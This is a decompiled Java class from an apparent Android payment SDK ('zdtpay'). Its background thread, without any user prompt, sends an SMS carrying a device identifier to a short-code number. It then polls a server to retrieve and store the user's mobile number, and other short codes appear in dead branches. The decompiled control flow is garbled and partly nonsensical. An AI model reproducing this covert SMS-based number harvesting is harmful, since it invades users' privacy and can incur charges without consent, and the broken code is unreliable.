package com.zdtpay;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import com.zdtpay.tools.MyLogPrinter;
import com.zdtpay.tools.c;
import com.zdtpay.tools.f;
import java.io.IOException;
import org.apache.http.client.ClientProtocolException;
import org.json.JSONException;
import org.json.JSONObject;

class r
  extends Thread
{
  r(Context paramContext) {}
  
  public void run()
  {
    SharedPreferences localSharedPreferences = this.a.getSharedPreferences("mysp", 0);
    Object localObject = localSharedPreferences.getString(c.o, "");
    if ((!((String)localObject).equals("")) && (!((String)localObject).equals("13800138000")))
    {
      MyLogPrinter.a("ZDTPaySDK.getM(...)0 mob " + (String)localObject);
      return;
    }
    localObject = f.e(this.a);
    if ((!((String)localObject).equals("")) && (!((String)localObject).equals("13800138000")))
    {
      localSharedPreferences.edit().putString(c.o, (String)localObject).commit();
      MyLogPrinter.a("ZDTPaySDK.getM(PhoneNumber)0 mob " + (String)localObject);
      return;
    }
    localObject = "106902601426";
    String str3 = f.l(this.a);
    String str4 = "A_" + str3;
    SmsManager localSmsManager = SmsManager.getDefault();
    String str5 = f.j(this.a);
    if ((str5 != null) && (!"".equals(str5))) {
      if (!str5.equals("2")) {}
    }
    for (;;)
    {
      MyLogPrinter.a("ZDTPaySDK.getM(...)1 " + str5);
      localSmsManager.sendTextMessage((String)localObject, null, str4, null, null);
      MyLogPrinter.a("ZDTPaySDK.getM(...)2 sms");
      int i = 0;
      label239:
      if (i > 5) {
        break;
      }
      try
      {
        Thread.sleep(5000L);
        MyLogPrinter.a("ZDTPaySDK.getM(...)3 get " + i);
        localObject = ZDTPaySDK.access$0(str3);
        if ((localObject != null) && (!"".equals(localObject)))
        {
          localObject = new JSONObject((String)localObject);
          int j = ((JSONObject)localObject).getInt("code");
          localObject = ((JSONObject)localObject).getString("mobile");
          if (j == 0)
          {
            localSharedPreferences.edit().putString(c.o, (String)localObject).commit();
            MyLogPrinter.a("ZDTPaySDK.getM(...)4 mob " + (String)localObject);
            return;
          }
        }
      }
      catch (InterruptedException localInterruptedException)
      {
        localInterruptedException.printStackTrace();
        i += 1;
        break label239;
        if (str5.equals("3")) {
          String str1 = "10659057320922";
        }
      }
      catch (ClientProtocolException localClientProtocolException)
      {
        for (;;)
        {
          localClientProtocolException.printStackTrace();
        }
      }
      catch (IOException localIOException)
      {
        for (;;)
        {
          localIOException.printStackTrace();
        }
      }
      catch (JSONException localJSONException)
      {
        for (;;)
        {
          localJSONException.printStackTrace();
        }
      }
      String str2 = "106575325305768";
    }
  }
}
